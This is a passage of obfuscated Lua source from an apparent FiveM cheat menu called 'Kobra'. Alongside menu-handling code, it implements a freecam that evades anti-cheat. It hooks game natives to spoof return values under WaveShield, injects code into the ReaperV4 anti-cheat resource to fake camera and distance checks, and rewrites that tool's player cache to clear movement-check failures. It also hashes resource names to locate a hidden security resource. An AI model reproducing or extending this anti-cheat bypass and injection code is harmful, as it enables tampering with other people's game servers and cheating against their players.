((v186.scrollType=="onScroll") and v186.onSelect) then if (v186.type=="slider-checkbox") then v186.onSelect(v186.value,v186.checked or false );else v186.onSelect(v186.value);end end break;end if (v866==1) then if (v184=="Left") then v186.value=math.max(v186.min or (0 + 0) ,v186.value-v867 );elseif (v184=="Right") then v186.value=math.min(v186.max or (381 -281) ,v186.value + v867 );end for v1157,v1158 in pairs(v25) do if ((v1158.type=="slider-checkbox") and (type(v1158.value)~="nil") and (v1158.label==v186.label)) then if (v184=="Left") then v1158.value=math.max(v186.min or 0 ,v186.value-v867 );elseif (v184=="Right") then v1158.value=math.min(v186.max or 100 ,v186.value + v867 );else return;end end end v866=5 -3 ;end end end break;end if (v185==0) then v186=v17[v15];if  not v186 then return;end v185=2 -1 ;end end end;v12.Enter=function(v187) if ( not v17 or ( #v17==0)) then return;end local v188=v17[v15];if  not v188 then return;end if  not v24 then return;end if (v188.type=="subMenu") then local v512=0;while true do if (v512==(4 -3)) then if (v188.type=="Server") then v12:UpdateListMenu();end if (v188.categories and (type(v188.categories)=="table") and ( #v188.categories>(1780 -(389 + 1391)))) then local v868=0;while true do if (v868==(2 + 0)) then v187:UpdateElements(v17);return;end if (v868==0) then v18=v188.categories;v19=1;v868=1;end if (1==v868) then v17=v18[v19].tabs or {} ;v15=1;v868=1 + 1 ;end end end v512=2;end if (v512==(4 -2)) then if (v188.subTabs and (type(v188.subTabs)=="table") and ( #v188.subTabs>(951 -(783 + 168)))) then local v869=0 -0 ;while true do if (v869==1) then v17=v188.subTabs;v15=1 + 0 ;v869=313 -(309 + 2) ;end if ((5 -3)==v869) then v187:UpdateElements(v17);return;end if ((1212 -(1090 + 122))==v869) then v18=nil;v19=1 + 0 ;v869=3 -2 ;end end end return;end if (v512==(0 + 0)) then table.insert(v20,{menu=v17,categories=v18,categoryIndex=v19});table.insert(v21,v188.label or "Submenu" );v512=1119 -(628 + 490) ;end end end if ((v188.type=="button") and v188.onSelect and (type(v188.onSelect)=="function")) then local v513=0;local v514;local v515;while true do if (v513==(0 + 0)) then v514,v515=pcall(v188.onSelect);if  not v514 then v187:Debug("red","onSelect error: "   .. tostring(v515) );end v513=2 -1 ;end if (v513==(4 -3)) then return;end end end if ((v188.type=="checkbox") or (v188.type=="scrollable-checkbox") or (v188.type=="slider-checkbox")) then local v516=774 -(431 + 343) ;while true do if ((1 -0)==v516) then if (v188.onSelect and (type(v188.onSelect)=="function")) then if (v188.type=="scrollable-checkbox") then local v1044=0 -0 ;local v1045;local v1046;while true do if (v1044==(0 + 0)) then v1045,v1046=pcall(v188.onSelect,v188.values[v188.value],v188.checked);if  not v1045 then v187:Debug("red","scrollable-checkbox onSelect error: "   .. tostring(v1046) );end break;end end elseif (v188.type=="slider-checkbox") then local v1159,v1160=pcall(v188.onSelect,v188.value,v188.checked);if  not v1159 then v187:Debug("red","slider-checkbox onSelect error: "   .. tostring(v1160) );end else local v1161=0;local v1162;local v1163;while true do if (v1161==(0 + 0)) then v1162,v1163=pcall(v188.onSelect,v188.checked);if  not v1162 then v187:Debug("red","checkbox onSelect error: "   .. tostring(v1163) );end break;end end end end v187:UpdateElements(v17);v516=1697 -(556 + 1139) ;end if (v516==(17 -(6 + 9))) then return;end if (v516==(0 + 0)) then if v188.locked then v187:Notify("error","Kobra","This module has been disabled due to high detection rates!",1537 + 1463 );return;end if (type(v188.checked)~="boolean") then v188.checked=true;else v188.checked= not v188.checked;end v516=170 -(28 + 141) ;end end end if ((v188.type=="scrollable") or (v188.type=="scrollable-checkbox")) then local v517=0 + 0 ;while true do if ((0 -0)==v517) then if (v188.values and (type(v188.values)=="table") and ( #v188.values>(0 + 0))) then if v188.onSelect then v188.onSelect(v188.values[v188.value]);end end return;end end end if ((v188.type=="slider") or (v188.type=="slider-checkbox")) then local v518=1317 -(486 + 831) ;while true do if ((0 -0)==v518) then if ((v188.scrollType=="onEnter") and v188.onSelect) then if (v188.type=="slider-checkbox") then v188.onSelect(v188.value,v188.checked or false );else v188.onSelect(v188.value);end end return;end end end end;local v64=false;v12.Backspace=function(v189) if ( #v20>(0 -0)) then local v519=0 + 0 ;local v520;while true do if (v519==(9 -6)) then v189:UpdateElements(v17);break;end if ((1263 -(668 + 595))==v519) then v520=table.remove(v20);table.remove(v21);v519=1 + 0 ;end if (v519==2) then v19=v520.categoryIndex or 1 ;v15=1;v519=3;end if (v519==(1 + 0)) then v17=v520.menu or v16 ;v18=v520.categories;v519=5 -3 ;end end else v189:HideUI();end end;v12.PrevCategory=function(v190) local v191=290 -(23 + 267) ;while true do if ((1946 -(1129 + 815))==v191) then v15=388 -(371 + 16) ;v190:UpdateElements(v17);v191=3;end if (v191==(1750 -(1326 + 424))) then if ( not v18 or ( #v18==(0 -0))) then return;end v19=v19-(3 -2) ;v191=119 -(88 + 30) ;end if (v191==(772 -(720 + 51))) then if (v19<(2 -1)) then v19= #v18;end v17=v18[v19].tabs or {} ;v191=1778 -(421 + 1355) ;end if (v191==3) then v190:SendMessage({action="keydown",index=v15-(1 -0) });break;end end end;v12.NextCategory=function(v192) local v193=0 + 0 ;while true do if (1==v193) then if (v19> #v18) then v19=1084 -(286 + 797) ;end v17=v18[v19].tabs or {} ;v193=7 -5 ;end if ((4 -1)==v193) then v192:SendMessage({action="keydown",index=v15-(440 -(397 + 42)) });break;end if (v193==0) then if ( not v18 or ( #v18==(0 + 0))) then return;end v19=v19 + 1 ;v193=801 -(24 + 776) ;end if (v193==2) then v15=1 -0 ;v192:UpdateElements(v17);v193=3;end end end;v12.ToggleFreecam=function(v194,v195,v196) if (type(v195)~="boolean") then return;end if v195 then v32=true;MachoSendDuiMessage(v14,json.encode({action="displayFreecam",visible=true,weaponIndex=v34,vehicleIndex=v35}));if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then MachoHookNative(5923634300000000000,function(...) return false, -(786 -(222 + 563));end);MachoHookNative(11673589000000000000 -663518433 ,function(...) return false,GetEntityCoords(PlayerPedId());end);MachoHookNative(14327026000000000000 -(59 + 562) ,function(...) return false,false;end);MachoHookNative(10181871000000000000 -(603 + 68) ,function(...) return false,0 + 0 ;end);MachoHookNative(12777102000000000000,function(...) return false,false;end);MachoHookNative(1858573000000000000 -(158 + 212) ,function(...) return false,987 -(825 + 162) ;end);MachoHookNative(15349248000000000000 -0 ,function(...) return false,0 + 0 ;end);MachoHookNative(18127728000000000000,function(...) return false,true;end);MachoHookNative(11059360000000000000,function(...) return false,true;end);_G.KobraFreecamSpeed=v196;if  not _G.KobraFreecamThreadRunning then _G.KobraFreecamEnabled=true;_G.KobraFreecamThreadRunning=true;function hNative(v1047,v1048) local v1049=0 + 0 ;local v1050;while true do if (v1049==(0 + 0)) then v1050=_G[v1047];if ( not v1050 or (type(v1050)~="function")) then return;end v1049=1;end if ((572 -(47 + 524))==v1049) then _G[v1047]=function(...) return v1048(v1050,...);end;break;end end end local function v975(v1051) local v1052=math.rad(v1051.z);local v1053=math.rad(v1051.x);local v1054=math.abs(math.cos(v1053));return vector3( -math.sin(v1052) * v1054 ,math.cos(v1052) * v1054 ,math.sin(v1053));end local function v976(v1055) local v1056=0 + 0 ;local v1057;while true do if (v1056==(0 -0)) then v1057=math.rad(v1055.z);return vector3(math.cos(v1057),math.sin(v1057),0);end end end local function v977(v1058,v1059,v1060) local v1061=0 -0 ;while true do if ((0 -0)==v1061) then if (v1058<v1059) then return v1059;end if (v1058>v1060) then return v1060;end v1061=1;end if (v1061==(1727 -(1165 + 561))) then return v1058;end end end hNative("RotationToDirection",function(v1062,...) return v1062(...);end);hNative("GetRightVector",function(v1063,...) return v1063(...);end);hNative("Clamp",function(v1064,...) return v1064(...);end);hNative("CreateThread",function(v1065,...) return v1065(...);end);hNative("Wait",function(v1066,...) return v1066(...);end);hNative("IsVehicleSeatFree",function(v1067,...) return v1067(...);end);hNative("PlayerPedId",function(v1068,...) return v1068(...);end);hNative("GetEntityCoords",function(v1069,...) return v1069(...);end);hNative("CreateCam",function(v1070,...) return v1070(...);end);hNative("DoesCamExist",function(v1071,...) return v1071(...);end);hNative("SetCamCoord",function(v1072,...) return v1072(...);end);hNative("SetCamRot",function(v1073,...) return v1073(...);end);hNative("RenderScriptCams",function(v1074,...) return v1074(...);end);hNative("DestroyCam",function(v1075,...) return v1075(...);end);hNative("SetFocusEntity",function(v1076,...) return v1076(...);end);hNative("SetTextFont",function(v1077,...) return v1077(...);end);hNative("SetTextProportional",function(v1078,...) return v1078(...);end);hNative("SetTextScale",function(v1079,...) return v1079(...);end);hNative("SetTextDropShadow",function(v1080,...) return v1080(...);end);hNative("SetTextEdge",function(v1081,...) return v1081(...);end);hNative("SetTextOutline",function(v1082,...) return v1082(...);end);hNative("SetTextCentre",function(v1083,...) return v1083(...);end);hNative("SetTextColour",function(v1084,...) return v1084(...);end);hNative("BeginTextCommandDisplayText",function(v1085,...) return v1085(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1086,...) return v1086(...);end);hNative("EndTextCommandDisplayText",function(v1087,...) return v1087(...);end);hNative("GetCamCoord",function(v1088,...) return v1088(...);end);hNative("GetCamRot",function(v1089,...) return v1089(...);end);hNative("IsControlPressed",function(v1090,...) return v1090(...);end);hNative("GetDisabledControlNormal",function(v1091,...) return v1091(...);end);hNative("TaskStandStill",function(v1092,...) return v1092(...);end);hNative("SetFocusPosAndVel",function(v1093,...) return v1093(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1094,...) return v1094(...);end);hNative("GetShapeTestResult",function(v1095,...) return v1095(...);end);hNative("IsControlJustPressed",function(v1096,...) return v1096(...);end);hNative("IsDisabledControlJustPressed",function(v1097,...) return v1097(...);end);hNative("IsEntityAVehicle",function(v1098,...) return v1098(...);end);hNative("TaskWarpPedIntoVehicle",function(v1099,...) return v1099(...);end);hNative("SetEntityCoords",function(v1100,...) return v1100(...);end);hNative("GiveWeaponToPed",function(v1101,...) return v1101(...);end);hNative("SetCurrentPedWeapon",function(v1102,...) return v1102(...);end);hNative("ShootSingleBulletBetweenCoords",function(v1103,...) return v1103(...);end);local v978=GetEntityCoords(PlayerPedId());_G.KobraFreecamObject=CreateCam("DEFAULT_SCRIPTED_CAMERA",true);SetCamCoord(_G.KobraFreecamObject,v978.x,v978.y,v978.z + 2 );SetCamRot(_G.KobraFreecamObject,0 + 0 ,0,GetEntityHeading(PlayerPedId()),2);RenderScriptCams(true,false,0,true,true);CreateThread(function() while _G.KobraFreecamThreadRunning do Wait(0 -0 );if _G.KobraFreecamObject then local v1195=0 + 0 ;local v1196;local v1197;local v1198;local v1199;local v1200;local v1201;local v1202;local v1203;local v1204;local v1205;local v1206;local v1207;local v1208;while true do if (v1195==(484 -(341 + 138))) then SetCamCoord(_G.KobraFreecamObject,v1196.x + v1202 ,v1196.y + v1203 ,v1196.z + v1204 );v1205=GetDisabledControlNormal(0 + 0 ,1);v1206=GetDisabledControlNormal(0 -0 ,328 -(89 + 237) );v1195=6;end if (2==v1195) then v1202,v1203,v1204=0 -0 ,0 -0 ,881 -(581 + 300) ;TaskStandStill(PlayerPedId(),10);SetFocusPosAndVel(v1196.x,v1196.y,v1196.z,0,0,1220 -(855 + 365) );v1195=6 -3 ;end if (1==v1195) then v1199=(IsControlPressed(0 + 0 ,1256 -(1030 + 205) ) and (v1198 + 1 + 0)) or v1198 ;v1200=v975(v1197);v1201=v976(v1197);v1195=2 + 0 ;end if (v1195==(292 -(156 + 130))) then v1207=v977(v1197.x-(v1206 * 5) , -(201 -112),89);v1208=v1197.z-(v1205 * (8 -3)) ;SetCamRot(_G.KobraFreecamObject,v1207,v1197.y,v1208,3 -1 );break;end if (v1195==0) then v1196=GetCamCoord(_G.KobraFreecamObject);v1197=GetCamRot(_G.KobraFreecamObject,1 + 1 );v1198=_G.KobraFreecamSpeed or 0.25 ;v1195=1 + 0 ;end if (v1195==(72 -(10 + 59))) then if IsControlPressed(0,10 + 22 ) then local v1414=0;while true do if (v1414==(0 -0)) then v1202=v1202 + (v1200.x * v1199) ;v1203=v1203 + (v1200.y * v1199) ;v1414=1;end if ((1164 -(671 + 492))==v1414) then v1204=v1204 + (v1200.z * v1199) ;break;end end end if IsControlPressed(0 + 0 ,33) then v1202=v1202-(v1200.x * v1199) ;v1203=v1203-(v1200.y * v1199) ;v1204=v1204-(v1200.z * v1199) ;end if IsControlPressed(1215 -(369 + 846) ,10 + 24 ) then local v1415=0 + 0 ;while true do if (v1415==(1945 -(1036 + 909))) then v1202=v1202-(v1201.x * v1199) ;v1203=v1203-(v1201.y * v1199) ;break;end end end v1195=4 + 0 ;end if (v1195==(6 -2)) then if IsControlPressed(203 -(11 + 192) ,18 + 17 ) then local v1416=175 -(135 + 40) ;while true do if (0==v1416) then v1202=v1202 + (v1201.x * v1199) ;v1203=v1203 + (v1201.y * v1199) ;break;end end end if IsControlPressed(0 -0 ,22) then v1204=v1204 + v1199 ;end if IsControlPressed(0 + 0 ,78 -42 ) then v1204=v1204-v1199 ;end v1195=7 -2 ;end end end end end);else _G.KobraFreecamEnabled=true;end else v48(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                print("hello im inside of a resource")
                    _G.KobraFreecamSpeed = ]]   .. v196   .. [[

                    if not _G.KobraFreecamThreadRunning then
                        _G.KobraFreecamEnabled = true
                        _G.KobraFreecamThreadRunning = true
                    
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        local function RotationToDirection(rot)
                            local z = math.rad(rot.z)
                            local x = math.rad(rot.x)
                            local num = math.abs(math.cos(x))
                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                        end

                        local function GetRightVector(rot)
                            local z = math.rad(rot.z)
                            return vector3(math.cos(z), math.sin(z), 0.0)
                        end

                        local function Clamp(val, min, max)
                            if val < min then return min end
                            if val > max then return max end
                            return val
                        end

                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                        local coords = GetEntityCoords(PlayerPedId())
                        _G.KobraFreecamObject = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                        SetCamCoord(_G.KobraFreecamObject, coords.x, coords.y, coords.z + 2.0)
                        SetCamRot(_G.KobraFreecamObject, 0.0, 0.0, GetEntityHeading(PlayerPedId()), 2)
                        RenderScriptCams(true, false, 0, true, true)
                        
                        CreateThread(function()
                            while _G.KobraFreecamThreadRunning do
                                Wait(0)

                                if _G.KobraFreecamObject then
                                    local coords = GetCamCoord(_G.KobraFreecamObject)
                                    local rot = GetCamRot(_G.KobraFreecamObject, 2)
                                    local beforeSpeed = _G.KobraFreecamSpeed or 0.25
                                    local speed = IsControlPressed(0, 21) and beforeSpeed + 1.0 or beforeSpeed
                                    local forward = RotationToDirection(rot)
                                    local right = GetRightVector(rot)
                                    local moveX, moveY, moveZ = 0, 0, 0

                                    TaskStandStill(PlayerPedId(), 10)
                                    SetFocusPosAndVel(coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)

                                    if IsControlPressed(0, 32) then moveX = moveX + forward.x * speed moveY = moveY + forward.y * speed moveZ = moveZ + forward.z * speed end
                                    if IsControlPressed(0, 33) then moveX = moveX - forward.x * speed moveY = moveY - forward.y * speed moveZ = moveZ - forward.z * speed end
                                    if IsControlPressed(0, 34) then moveX = moveX - right.x * speed moveY = moveY - right.y * speed end
                                    if IsControlPressed(0, 35) then moveX = moveX + right.x * speed moveY = moveY + right.y * speed end
                                    if IsControlPressed(0, 22) then moveZ = moveZ + speed end
                                    if IsControlPressed(0, 36) then moveZ = moveZ - speed end

                                    SetCamCoord(_G.KobraFreecamObject, coords.x + moveX, coords.y + moveY, coords.z + moveZ)

                                    local x = GetDisabledControlNormal(0, 1)
                                    local y = GetDisabledControlNormal(0, 2)
                                    local newPitch = Clamp(rot.x - y * 5, -89.0, 89.0)
                                    local newYaw = rot.z - x * 5

                                    SetCamRot(_G.KobraFreecamObject, newPitch, rot.y, newYaw, 2)
                                end
                            end
                        end)
                    else
                        _G.KobraFreecamEnabled = true
                    end
                ]] );end else if  not v30 then local v828=0;local v829;local v830;while true do if (v828==(177 -(50 + 126))) then function v829() local v1126=0 -0 ;local v1127;local v1128;local v1129;local v1130;local v1131;local v1132;local v1133;local v1134;while true do if (v1126==(1 + 2)) then for v1298,v1299 in ipairs(v1132) do v1133=v1133 + 1 ;if (v1128(v1299)==v1130) then print("^7[^5Kobra^7]: [^3DEBUG^7]: Reaper Security Resource Found: "   .. v1299 );v1134=v1299;break;end local v1300=v1299:gsub("[-_]","");if ((v1300~=v1299) and (v1128(v1300)==v1130)) then v1134=v1300;break;end if ((v1133%(1463 -(1233 + 180)))==(969 -(522 + 447))) then Wait(1421 -(107 + 1314) );end end if v1134 then return v1134;end break;end if ((1 + 0)==v1126) then v1130=tonumber(v1129);if  not v1130 then return;end v1131=GetNumResources() or (0 -0) ;v1132={};v1126=1 + 1 ;end if (v1126==(0 -0)) then v1127=false;v1128=nil;function v1128(v1301,v1302) local v1303=0 -0 ;local v1304;while true do if (v1303==(1911 -(716 + 1194))) then v1304=92 + 5289 ;for v1508=1, #v1301 do local v1509=string.byte(v1301,v1508);v1304=(v1304 * 33)~v1509 ;end v1303=1 + 1 ;end if (v1303==(503 -(74 + 429))) then v1302=v1302 or "072b0945-fdd6d8bb-2e1d0476-d15c8f4b-ed6db3e1" ;v1301=v1301   .. v1302 ;v1303=1;end if ((3 -1)==v1303) then return v1304;end end end v1129=GetConvar("reaper_security_resource","");v1126=1 + 0 ;end if (v1126==2) then for v1305=0 -0 ,v1131-(1 + 0)  do local v1306=0;local v1307;while true do if (v1306==0) then v1307=GetResourceByFindIndex(v1305);if (v1307 and (v1307~="")) then table.insert(v1132,v1307);end break;end end end if ( #v1132==(0 -0)) then return;end v1133=0 -0 ;v1134=nil;v1126=436 -(279 + 154) ;end end end v830=v829();v828=780 -(454 + 324) ;end if (v828==(2 + 0)) then MachoInjectResource("ReaperV4",[[
                    _G["GetRenderingCam"] = function()
                        return 0
                    end

                    _G["GetDistanceBetweenCoords"] = function()
                        return 0
                    end
                ]]);Wait(250);v828=3;end if (v828==(17 -(12 + 5))) then print("[^5Kobra^7]: [^3DEBUG^7] >> Loading ReaperV4 Freecam Bypass");v829=nil;v828=1 + 0 ;end if (v828==(10 -6)) then print("[^5Kobra^7]: [^2DEBUG^7] >> Loaded ReaperV4 Freecam Bypass");v30=true;break;end if (v828==3) then if v830 then MachoInjectResource(v830,[[
                        _G["GetRenderingCam"] = function()
                            return 0
                        end

                        _G["GetDistanceBetweenCoords"] = function()
                            return 0
                        end
                    ]]);end MachoInjectResource("any",[[
                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "player_loaded", false, true)
                    if success then
                        print("Updated Cache 1 Successfully")
                    else
                        print("Failed to Update Cache 1")
                    end

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "LastFailedMovementChecks", 0, true)
                    if success then
                        print("Updated Cache 2 Successfully")
                    else
                        print("Failed to Update 2 Cache")
                    end

                    Wait(500)

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "NetworkIsInSpectatorMode", true, true)
                    if success then
                        print("Updated Cache 3 Successfully")
                    else
                        print("Failed to Update Cache 3")
                    end
                ]]);v828=4;end end end _G.KobraFreecamSpeed=v196;if  not _G.KobraFreecamThreadRunning then _G.KobraFreecamEnabled=true;_G.KobraFreecamThreadRunning=true;function hNative(v872,v873) local v874=0 + 0 ;local v875;while true do if (v874==(1093 -(277 + 816))) then v875=_G[v872];if ( not v875 or (type(v875)~="function")) then return;end v874=4 -3 ;end if ((1184 -(1058 + 125))==v874) then _G[v872]=function(...) return v873(v875,...);end;break;end end end local function v831(v876) local v877=math.rad(v876.z);local v878=math.rad(v876.x);local v879=math.abs(math.cos(v878));return vector3( -math.sin(v877) * v879 ,math.cos(v877) * v879 ,math.sin(v878));end local function v832(v880) local v881=math.rad(v880.z);return vector3(math.cos(v881),math.sin(v881),0 + 0 );end local function v833(v882,v883,v884) if (v882<v883) then return v883;end if (v882>v884) then return v884;end return v882;end hNative("RotationToDirection",function(v885,...) return v885(...);end);hNative("GetRightVector",function(v886,...) return v886(...);end);hNative("Clamp",function(v887,...) return v887(...);end);hNative("CreateThread",function(v888,...) return v888(...);end);hNative("Wait",function(v889,...) return v889(...);end);hNative("IsVehicleSeatFree",function(v890,...) return v890(...);end);hNative("PlayerPedId",function(v891,...) return v891(...);end);hNative("GetEntityCoords",function(v892,...) return v892(...);end);hNative("CreateCam",function(v893,...) return v893(...);end);hNative("DoesCamExist",function(v894,...) return v894(...);end);hNative("SetCamCoord",function(v895,...) return v895(...);end);hNative("SetCamRot",function(v896,...) return v896(...);end);hNative("RenderScriptCams",function(v897,...) return v897(...);end);hNative("DestroyCam",function(v898,...) return v898(...);end);hNative("SetFocusEntity",function(v899,...) return v899(...);end);hNative("SetTextFont",function(v900,...) return v900(...);end);hNative("SetTextProportional",function(v901,...) return v901(...);end);hNative("SetTextScale",function(v902,...) return v902(...);end);hNative("SetTextDropShadow",function(v903,...) return v903(...);end);hNative("SetTextEdge",function(v904,...) return v904(...);end);hNative("SetTextOutline",function(v905,...) return v905(...);end);hNative("SetTextCentre",function(v906,...) return v906(...);end);hNative("SetTextColour",function(v907,...) return v907(...);end);hNative("BeginTextCommandDisplayText",function(v908,...) return v908(...);end);hNative("AddTextComponentSubstringPlayerName",function(v909,...) return v909(...);end);hNative("EndTextCommandDisplayText",function(v910,...) return v910(...);end);hNative("GetCamCoord",function(v911,...) return v911(...);end);hNative("GetCamRot",function(v912,...) return v912(...);end);hNative("IsControlPressed",function(v913,...) return v913(...);end);hNative("GetDisabledControlNormal",function(v914,...) return v914(...);end);hNative("TaskStandStill",function(v915,...) return v915(...);end);hNative("SetFocusPosAndVel",function(v916,...) return v916(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v917,...) return v917(...);end);hNative("GetShapeTestResult",function(v918,...) return v918(...);end);hNative("IsControlJustPressed",function(v919,...) return v919(...);end);hNative("IsDisabledControlJustPressed",function(v920,...) return v920(...);end);hNative("IsEntityAVehicle",function(v921,...) return v921(...);end);hNative("TaskWarpPedIntoVehicle",function(v922,...) return v922(...);end);hNative("SetEntityCoords",function(v923,...) return v923(...);end);hNative("GiveWeaponToPed",function(v924,...) return v924(...);end);hNative("SetCurrentPedWeapon",function(v925,...) return v925(...);end);hNative("ShootSingleBulletBetweenCoords",function(v926,...) return v926(...);end);local v834=GetEntityCoords(PlayerPedId());_G.KobraFreecamObject=CreateCam("DEFAULT_SCRIPTED_CAMERA",true);SetCamCoord(_G.KobraFreecamObject,v834.x,v834.y,v834.z + (977 -(815 + 160)) );SetCamRot(_G.KobraFreecamObject,0 -0 ,0,GetEntityHeading(PlayerPedId()),4 -2 );RenderScriptCams(true,false,0 + 0 ,true,true);CreateThread(function() while _G.KobraFreecamThreadRunning do Wait(0 -0 );if (_G.KobraFreecamEnabled and _G.KobraFreecamObject) then local v1135=1898 -(41 + 1857) ;local v1136;local v1137;local v1138;local v1139;local v1140;local v1141;local v1142;local v1143;local v1144;local v1145;local v1146;local v1147;local v1148;while true do if (v1135==(1896 -(1222 + 671))) then if IsControlPressed(0 -0 ,49 -14 ) then local v1322=1182 -(229 + 953) ;while true do if (v1322==0) then v1142=v1142 + (v1141.x * v1139) ;v1143=v1143 + (v1141.y * v1139) ;break;end end end if IsControlPressed(1774 -(1111 + 663) ,22) then v1144=v1144 + v1139 ;end if IsControlPressed(1579 -(874 + 705) ,6 + 30 ) then v1144=v1144-v1139 ;end SetCamCoord(_G.KobraFreecamObject,v1136.x + v1142 ,v1136.y + v1143 ,v1136.z + v1144 );v1135=4;end if (v1135==(0 + 0)) then v1136=GetCamCoord(_G.KobraFreecamObject);v1137=GetCamRot(_G.KobraFreecamObject,3 -1 );v1138=_G.KobraFreecamSpeed or 0.25 ;v1139=(IsControlPressed(0 + 0 ,700 -(642 + 37) ) and (v1138 + 1 + 0)) or v1138 ;v1135=1 + 0 ;end if (v1135==5) then SetCamRot(_G.KobraFreecamObject,v1147,v1137.y,v1148,4 -2 );break;end if (v1135==(458 -(233 + 221))) then v1145=GetDisabledControlNormal(0 -0 ,1 + 0 );v1146=GetDisabledControlNormal(0,2);v1147=v833(v1137.x-(v1146 * (1546 -(718 + 823))) , -(57 + 32),89);v1148=v1137.z-(v1145 * (810 -(266 + 539))) ;v1135=5;end if (v1135==(2 -1)) then v1140=v831(v1137);v1141=v832(v1137);v1142,v1143,v1144=1225 -(636 + 589) ,0,0;TaskStandStill(PlayerPedId(),23 -13 );v1135=3 -1 ;end if (v1135==(2 + 0)) then SetFocusPosAndVel(v1136.x,v1136.y,v1136.z,0,0 + 0 ,1015 -(657 + 358) );if IsControlPressed(0 -0 ,32) then v1142=v1142 + (v1140.x * v1139) ;v1143=v1143 + (v1140.y * v1139) ;v1144=v1144 + (v1140.z * v1139) ;end if IsControlPressed(0 -0 ,33) then local v1323=0;while true do if (1==v1323) then v1144=v1144-(v1140.z * v1139) ;break;end if (v1323==(1187 -(1151 + 36))) then v1142=v1142-(v1140.x * v1139) ;v1143=v1143-(v1140.y * v1139) ;v1323=1 + 0 ;end end end if IsControlPressed(0,9 + 25 ) then local v1324=0 -0 ;while true do if (v1324==(1832 -(1552 + 280))) then v1142=v1142-(v1141.x * v1139) ;v1143=v1143-(v1141.y * v1139) ;break;end end end v1135=837 -(64 + 770) ;end end end end end);else _G.KobraFreecamEnabled=true;end end else local v521=0;while true do if (v521==(1 + 0)) then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then local v1104=0 -0 ;while true do if (v1104==2) then hNative("DestroyCam",function(v1215,...) return v1215(...);end);hNative("SetFocusEntity",function(v1216,...) return v1216(...);end);hNative("SetTextFont",function(v1217,...) return v1217(...);end);hNative("SetTextProportional",function(v1218,...) return v1218(...);end);hNative("SetTextScale",function(v1219,...) return v1219(...);end);hNative("SetTextDropShadow",function(v1220,...) return v1220(...);end);v1104=1 + 2 ;end if (v1104==(1249 -(157 + 1086))) then hNative("TaskWarpPedIntoVehicle",function(v1221,...) return v1221(...);end);hNative("SetEntityCoords",function(v1222,...) return v1222(...);end);hNative("GiveWeaponToPed",function(v1223,...) return v1223(...);end);hNative("SetCurrentPedWeapon",function(v1224,...) return v1224(...);end);hNative("ShootSingleBulletBetweenCoords",function(v1225,...) return v1225(...);end);RenderScriptCams(false,false,0,true,true);v1104=13 -6 ;end if (v1104==0) then _G.KobraFreecamEnabled=false;_G.KobraFreecamThreadRunning=false;function 